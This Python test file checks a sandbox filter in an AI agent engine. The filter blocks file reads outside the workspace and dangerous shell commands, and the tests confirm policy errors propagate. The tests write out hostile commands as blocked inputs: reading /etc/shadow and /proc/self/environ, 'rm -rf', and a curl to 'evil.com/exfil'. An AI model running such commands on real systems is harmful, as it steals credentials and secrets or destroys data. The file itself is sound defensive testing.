"""Security sandbox tests for slock engine tool filtering (AC-R07, AC-R08, AC-R11)."""

import sys
import types
from unittest.mock import MagicMock, patch

import pytest

# ---------------------------------------------------------------------------
# Mock external 'acp' SDK package (not installed in this environment).
# Multiple src/ modules import from acp.interfaces, acp.schema, acp.helpers,
# acp.stdio. We inject synthetic modules into sys.modules so the import chain
# for src.slock_engine.engine resolves without the external dep.
# ---------------------------------------------------------------------------
_EXT_ACP_SUBMODULES = ("acp", "acp.interfaces", "acp.schema", "acp.helpers", "acp.stdio")
_acp_stubs: dict = {}
for _mod_name in _EXT_ACP_SUBMODULES:
    if _mod_name not in sys.modules:
        _stub = types.ModuleType(_mod_name)
        _stub.__package__ = "acp"
        if _mod_name == "acp":
            _stub.__path__ = []  # marks it as a package
        # Provide commonly imported names as MagicMock so attr access works
        _stub.__dict__.setdefault("__all__", [])
        sys.modules[_mod_name] = _stub
        _acp_stubs[_mod_name] = _stub

# Populate attributes that source code imports from external acp
_acp_iface = sys.modules["acp.interfaces"]
_acp_iface.Agent = MagicMock
_acp_iface.Client = MagicMock

_acp_schema = sys.modules["acp.schema"]
_acp_schema.PromptResponse = MagicMock
# src/acp/client.py imports several schema classes — module-level __getattr__ as catch-all
try:
    _acp_schema.__getattr__ = lambda name: MagicMock
except (AttributeError, TypeError):
    pass  # Already a MagicMock — attribute access already returns MagicMock

_acp_helpers = sys.modules["acp.helpers"]
_acp_helpers.text_block = MagicMock()

_acp_stdio = sys.modules["acp.stdio"]
_acp_stdio.spawn_agent_process = MagicMock()

# ---------------------------------------------------------------------------

from src.slock_engine.exceptions import SecurityPolicyDegradedError
from src.slock_engine.models import AgentIdentity


def _make_agent(*, workspace="/workspace/project", permissions=None):
    """Create a test agent with given workspace and permissions."""
    return AgentIdentity(
        agent_id="test-agent-001",
        name="test-agent",
        workspace_path=workspace,
        permissions=["shell"] if permissions is None else permissions,
        agent_type="coco",
        role="coder",
    )


def _make_engine_with_filter(agent):
    """Create a minimal engine and extract the _path_filter closure."""
    import re

    from src.slock_engine.engine import SlockEngine

    # Create a mock session that captures the filter
    mock_session = MagicMock()
    captured_filter = None

    def capture_filter(fn):
        nonlocal captured_filter
        captured_filter = fn

    mock_session.set_tool_filter = capture_filter

    # Build engine with minimal config
    mock_settings = MagicMock()
    mock_settings.slock_tool_path_restrictions = []
    mock_settings.slock_dangerous_shell_patterns = []

    engine = SlockEngine.__new__(SlockEngine)
    engine._settings = mock_settings

    # Initialize _dangerous_shell_patterns (normally done in __init__)
    all_patterns = list(SlockEngine._BUILTIN_DANGEROUS_PATTERNS)
    engine._dangerous_shell_patterns = re.compile(
        r"|".join(all_patterns), re.IGNORECASE,
    )

    engine._apply_tool_restrictions(mock_session, agent)
    assert captured_filter is not None, "Filter was not set on session"
    return captured_filter


class TestFileReadPathRestriction:
    """AC-R07: file_read to /etc/passwd should be blocked."""

    def test_file_read_etc_passwd_blocked(self):
        agent = _make_agent()
        path_filter = _make_engine_with_filter(agent)

        result = path_filter("file_read", {"path": "/etc/passwd"})
        assert result is False

    def test_file_read_within_workspace_allowed(self):
        agent = _make_agent()
        path_filter = _make_engine_with_filter(agent)

        result = path_filter("file_read", {"path": "/workspace/project/src/main.py"})
        assert result is True

    def test_file_list_etc_blocked(self):
        agent = _make_agent()
        path_filter = _make_engine_with_filter(agent)

        result = path_filter("file_list", {"path": "/etc/"})
        assert result is False

    def test_grep_outside_workspace_blocked(self):
        agent = _make_agent()
        path_filter = _make_engine_with_filter(agent)

        result = path_filter("grep", {"path": "/home/other_user/secrets"})
        assert result is False


class TestShellPathTraversal:
    """AC-R08: Shell commands with path traversal to sensitive dirs blocked."""

    def test_shell_cat_traversal_etc_shadow(self):
        agent = _make_agent()
        path_filter = _make_engine_with_filter(agent)

        result = path_filter("shell", {"command": "cat ../../etc/shadow", "cwd": "/workspace/project"})
        assert result is False

    def test_shell_access_proc(self):
        agent = _make_agent()
        path_filter = _make_engine_with_filter(agent)

        result = path_filter("shell", {"command": "cat /proc/self/environ"})
        assert result is False

    def test_shell_rm_rf_blocked(self):
        agent = _make_agent()
        path_filter = _make_engine_with_filter(agent)

        result = path_filter("shell", {"command": "rm -rf /workspace/project"})
        assert result is False

    def test_shell_curl_blocked(self):
        agent = _make_agent()
        path_filter = _make_engine_with_filter(agent)

        result = path_filter("shell", {"command": "curl http://evil.com/exfil"})
        assert result is False

    def test_shell_safe_command_allowed(self):
        agent = _make_agent()
        path_filter = _make_engine_with_filter(agent)

        result = path_filter("shell", {"command": "ls -la", "cwd": "/workspace/project"})
        assert result is True

    def test_shell_without_permission_blocked(self):
        agent = _make_agent(permissions=[])
        path_filter = _make_engine_with_filter(agent)

        result = path_filter("shell", {"command": "ls"})
        assert result is False


class TestSecurityPolicyDegradedPropagation:
    """AC-R11: SecurityPolicyDegradedError propagates to caller."""

    def test_security_policy_degraded_raises(self):
        from src.slock_engine.engine import SlockEngine

        agent = _make_agent()

        # Session without set_tool_filter
        mock_session = MagicMock(spec=[])  # empty spec = no attributes

        engine = SlockEngine.__new__(SlockEngine)
        engine._settings = MagicMock()
        engine._settings.slock_tool_path_restrictions = ["/workspace"]

        with pytest.raises(SecurityPolicyDegradedError):
            engine._apply_tool_restrictions(mock_session, agent)

    def test_security_policy_degraded_not_swallowed_in_run_acp(self):
        """Verify _run_acp_session re-raises SecurityPolicyDegradedError."""
        from src.slock_engine.engine import SlockEngine

        agent = _make_agent()

        engine = SlockEngine.__new__(SlockEngine)
        engine._settings = MagicMock()
        engine._settings.slock_tool_path_restrictions = ["/workspace"]
        engine._settings.coco_execution_timeout = 60
        engine._lock = MagicMock()
        engine._agent_sessions = {}
        engine._agent_execution_errors = {}
        engine.root_path = "/workspace/project"

        # Mock create_engine_session to return a session without set_tool_filter
        mock_session = MagicMock(spec=["send_prompt", "close"])  # no set_tool_filter

        with patch("src.slock_engine.engine.create_engine_session", return_value=mock_session):
            with patch.object(engine, "transition_agent"):
                with pytest.raises(SecurityPolicyDegradedError):
                    engine._run_acp_session(agent, "test prompt")
